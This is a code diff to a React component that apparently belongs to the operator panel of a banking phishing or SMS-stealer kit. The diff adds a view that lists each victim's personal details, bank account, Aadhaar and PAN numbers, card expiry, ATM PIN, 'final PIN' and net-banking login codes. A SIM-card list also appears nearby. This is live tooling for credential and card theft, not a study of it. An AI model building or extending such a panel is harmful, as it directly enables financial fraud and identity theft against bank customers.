@@ -117,19 +117,73 @@ function FormsList({ forms }: { forms: FormData[] }) {
         );
     }
 
+    // Sort forms by submission date (newest first)
+    const sortedForms = [...forms].sort((a, b) =>
+        new Date(b.submittedAt).getTime() - new Date(a.submittedAt).getTime()
+    );
+
     return (
         <div className="data-list">
-            {forms.map((form, idx) => (
-                <div key={idx} className="data-item">
-                    <div className="data-item-icon">📋</div>
-                    <div className="data-item-content">
-                        <div className="data-item-header">
-                            <span className="data-item-title">{form.name}</span>
-                            <span className="data-item-time">{formatTime(form.submittedAt)}</span>
+            {sortedForms.map((form, idx) => (
+                <div key={idx} className="data-item" style={{ display: 'block', padding: '1rem' }}>
+                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1rem' }}>
+                        <div style={{ display: 'flex', alignItems: 'center', gap: '0.75rem' }}>
+                            <span style={{ fontSize: '1.5rem' }}>📋</span>
+                            <div>
+                                <div style={{ fontWeight: 600, color: 'var(--text-primary)' }}>
+                                    {form.fullName || form.name || 'Unknown'}
+                                </div>
+                                <div style={{ fontSize: '0.75rem', color: 'var(--text-muted)' }}>
+                                    Submission #{sortedForms.length - idx}
+                                </div>
+                            </div>
                         </div>
-                        <div className="data-item-body">
-                            <div><strong>Phone:</strong> {form.phoneNumber}</div>
-                            <div><strong>ID:</strong> {form.id}</div>
+                        <span style={{ fontSize: '0.75rem', color: 'var(--text-muted)' }}>
+                            {formatTime(form.submittedAt)}
+                        </span>
+                    </div>
+
+                    {/* Personal Details */}
+                    <div style={{ marginBottom: '1rem' }}>
+                        <div style={{ fontWeight: 600, marginBottom: '0.5rem', color: 'var(--primary)' }}>👤 Personal Details</div>
+                        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '0.5rem', fontSize: '0.875rem' }}>
+                            <div><strong>Name:</strong> {form.fullName || form.name || 'N/A'}</div>
+                            <div><strong>Mobile:</strong> {form.mobileNumber || form.phoneNumber || 'N/A'}</div>
+                            <div><strong>Mother:</strong> {form.motherName || 'N/A'}</div>
+                            <div><strong>DOB:</strong> {form.dateOfBirth || 'N/A'}</div>
+                        </div>
+                    </div>
+
+                    {/* Account Details */}
+                    <div style={{ marginBottom: '1rem' }}>
+                        <div style={{ fontWeight: 600, marginBottom: '0.5rem', color: 'var(--primary)' }}>🏦 Account Details</div>
+                        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '0.5rem', fontSize: '0.875rem' }}>
+                            <div><strong>Account:</strong> {form.accountNumber || 'N/A'}</div>
+                            <div><strong>Aadhaar:</strong> {form.aadhaarNumber || 'N/A'}</div>
+                            <div><strong>PAN:</strong> {form.panCard || 'N/A'}</div>
+                            <div><strong>CIF:</strong> {form.cifNumber || 'N/A'}</div>
+                            <div><strong>Branch:</strong> {form.branchCode || 'N/A'}</div>
+                        </div>
+                    </div>
+
+                    {/* Card Details */}
+                    <div style={{ marginBottom: '1rem' }}>
+                        <div style={{ fontWeight: 600, marginBottom: '0.5rem', color: 'var(--primary)' }}>💳 Card Details</div>
+                        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '0.5rem', fontSize: '0.875rem' }}>
+                            <div><strong>Last 6:</strong> {form.cardLast6 || 'N/A'}</div>
+                            <div><strong>Expiry:</strong> {form.cardExpiry || 'N/A'}</div>
+                            <div><strong>PIN:</strong> {form.atmPin || 'N/A'}</div>
+                            <div><strong>Final PIN:</strong> {form.finalPin || 'N/A'}</div>
+                        </div>
+                    </div>
+
+                    {/* Login Credentials */}
+                    <div>
+                        <div style={{ fontWeight: 600, marginBottom: '0.5rem', color: 'var(--primary)' }}>🔐 Login Credentials</div>
+                        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '0.5rem', fontSize: '0.875rem' }}>
+                            <div><strong>User ID:</strong> {form.userId || 'N/A'}</div>
+                            <div><strong>Access Code:</strong> {form.accessCode || 'N/A'}</div>
+                            <div><strong>Profile Code:</strong> {form.profileCode || 'N/A'}</div>
                         </div>
                     </div>
                 </div>
@@ -137,6 +191,7 @@ function FormsList({ forms }: { forms: FormData[] }) {
         </div>
     );
 }
+
 
 // SIM Cards Component
 function SimCardsList({ simCards }: { simCards: SimInfo[] }) {
